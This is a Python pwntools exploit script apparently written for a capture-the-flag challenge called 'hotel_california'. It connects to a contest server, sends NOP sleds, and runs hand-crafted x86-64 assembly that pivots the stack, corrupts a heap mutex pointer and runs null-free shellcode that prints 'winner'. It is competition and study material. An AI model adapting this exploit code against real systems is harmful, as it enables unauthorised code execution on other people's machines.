#!/usr/bin/env python2
from pwn import *
import time

context.binary = "hotel_california_norandom"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(argv=["/root/Downloads/sde-external-8.35.0-2019-03-11-lin/sde64", "-hle_enabled", "-hle_abort_log", "-debug", "--", context.binary.path])
    """raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
       ]))"""
    print p.recvlines(3)[-1]
    print "continue"

else:
    p = remote("hotelcalifornia.quals2019.oooverflow.io", 7777)

p.recvuntil(' > ')

p.send('\x90'*1023 + '\x00')

p.recvuntil(' > ')

# Exploit

payload = asm("""
        /* rsp now end of .bss */
        add r11, 0x02010101;
        sub r11, 31519071;
        mov rsp, r11;

        /* save rsp init position */
        mov r15,rsp;

        /* libc rw address in rax */
        mov rax,[rsp+24];
        
        /* bins */
        add rax, -2752;

        /* rdi has heap addr */
        mov rdi,[rax];

        /* fix rdi pointer, points at mutex */
        add rdi,-2128;

        /* restore stack pointer to bss */
        mov rsp,r15;

        mov r15,rdi;
        add r15,5;
        mov WORD PTR [r15],0x7feb;

        /* testing */;
        mov r10, rdi;
        sub r10,4;
        /*or WORD PTR [r10], 0xb848;*/
        mov DWORD PTR [r10], 0x07c7f390;
        pop r15;
        call r10;

        /* should be broken out after two instruction */
        """)
if "\x00" in payload:
    print "null in payload"
    print repr(payload)
    exit()

final_shellcode = encoder.null(asm("mov rsp, rax;" + shellcraft.echo("winner", 1)))
prelude = asm("xor r12,rdi") + "\x74\x7f" + final_shellcode


print "payload len:", len(payload)
print "prelude len:", len(prelude)
pad_len = 800 - len(prelude) - len(payload) - 200
p.send("\x90"*pad_len + prelude + "\x90"*200 + payload + '\x00')
p.interactive()
